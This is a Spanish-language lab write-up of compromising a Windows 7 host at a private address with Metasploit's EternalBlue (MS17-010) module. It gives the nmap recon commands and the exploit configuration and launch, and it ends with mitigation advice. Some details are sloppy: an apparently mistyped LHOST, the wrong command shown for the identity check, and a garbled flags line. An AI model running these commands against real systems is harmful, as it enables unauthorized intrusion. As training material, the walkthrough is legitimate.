# Máquina Windows 7 professional (Explotación con Metasploit)
<img width="1344" height="768" alt="NoteGPT_Image_20260704232101" src="https://github.com/user-attachments/assets/77910293-a99d-4f4b-957f-b4b6799a0043" />

Este documento detalla el proceso de auditoría y explotación de la máquina **Windows 7 professional**, enfocándose en el uso del framework **Metasploit** para obtener acceso inicial mediante la vulnerabilidad EternalBlue y escalar privilegios en el sistema.

---

## 1. Fase de Reconocimiento y Escaneo

Comenzamos identificando los puertos abiertos y servicios activos en la máquina objetivo mediante un escaneo rápido con `nmap`.

```bash
nmap -sV -sC -p- --min-rate 5000 -oN nmap_scan.txt 192.168.1.57
```

### Resultados Clave del Escaneo:
* **Puerto 80/tcp**: Servidor Web HTTP (IIS).
* **Puerto 135/tcp**: Servicio RPC de Windows.
* **Puerto 445/tcp**: Servicio SMB de Windows (Soporte SMBv1 detectado).

---

## 2. Análisis de Vulnerabilidades (SMBv1)

Dado que estamos frente a un sistema operativo obsoleto (**Windows 7**) y que el puerto **445/tcp** está expuesto, el sistema podría ser susceptible a **EternalBlue**. Esta vulnerabilidad crítica afecta a versiones de Windows no actualizadas y explota un fallo en el protocolo **SMBv1**, lo que permite la ejecución remota de código (RCE) y el control completo del sistema afectado (famoso por ataques masivos como el ransomware *WannaCry*).

Para determinar de forma segura si el sistema es vulnerable antes de lanzar un exploit, procedemos a realizar una verificación detallada con scripts específicos de `nmap`:

```bash
nmap -p445 --script="vuln and safe" 192.168.1.57
```

**Resultado:** El script confirma que el objetivo es vulnerable a **MS17-010 (EternalBlue)**.

---

## 3. Explotación (Acceso Inicial)

Con la información obtenida anteriormente, procedemos a automatizar la explotación utilizando el framework de **Metasploit**.

1. Iniciamos la consola de Metasploit:
   ```bash
   msfconsole
   ```

2. Buscamos la vulnerabilidad exacta obtenida en el escaneo previo:
   ```bash
   search eternalblue
   ```

3. Revisamos los resultados. Seleccionamos la opción correspondiente a la arquitectura de nuestra máquina víctima (Windows 7):
   ```bash
   use 1
   ```
   *(Nota: Este módulo mapea habitualmente a `exploit/windows/smb/ms17_010_eternalblue`)*.

4. Miramos las opciones que tenemos que configurar con el comando:
   ```bash
   show options
   ```

5. Configuramos los parámetros necesarios para realizar el ataque:
   * **RHOSTS:** Definimos la dirección IP del host remoto (objetivo).
   * **LHOST:** Establecemos la dirección IP de nuestro host local (atacante).

   ```bash
   set RHOSTS 192.168.1.57
   set LHOST 192.158.1.50
   ```

6. Una vez configurados los parámetros correctamente, procedemos a verificar y ejecutar la explotación para confirmar la presencia del fallo y obtener el control del sistema remoto:
   ```bash
   exploit
   ```

**Resultado:** El exploit se ejecuta con éxito, otorgándonos una sesión activa de **Meterpreter**.

---

## 4. Escalada de Privilegios

Debido a la naturaleza de la vulnerabilidad *EternalBlue*, el exploit inyecta el payload directamente en el espacio de memoria del proceso `lsass.exe` o del sistema. 

Al verificar nuestra identidad dentro de la sesión de Meterpreter:
```bash
shell
```

**Resultado:** `Server username: NT AUTHORITY\SYSTEM`

*Nota: Al explotar exitosamente MS17-010, el acceso se obtiene directamente con los máximos privilegios del sistema, por lo que no es necesario realizar tareas adicionales de escalada local.*

---

## 5. Post-Explotación y Obtención de Flags

Con acceso total y persistente bajo el usuario `SYSTEM`, procedemos a recolectar las pruebas (flags) de compromiso.

* ** y somo root**

---

## 6. Medidas de Mitigación Recomendadas

Para corregir esta vulnerabilidad crítica en la infraestructura, se deben aplicar las siguientes contramedidas de forma inmediata:
1. **Actualización del Sistema Operativo:** Migrar el sistema obsoleto Windows 7 a una versión de Windows moderna y con soporte vigente.
2. **Aplicación de Parches:** En caso de no poder migrar inmediatamente, instalar el parche de seguridad correspondiente emitido por Microsoft en el boletín [MS17-010](https://microsoft.com).
3. **Desactivación de SMBv1:** Deshabilitar por completo el protocolo obsoleto SMBv1 en las configuraciones del sistema o mediante directivas de grupo (GPO).
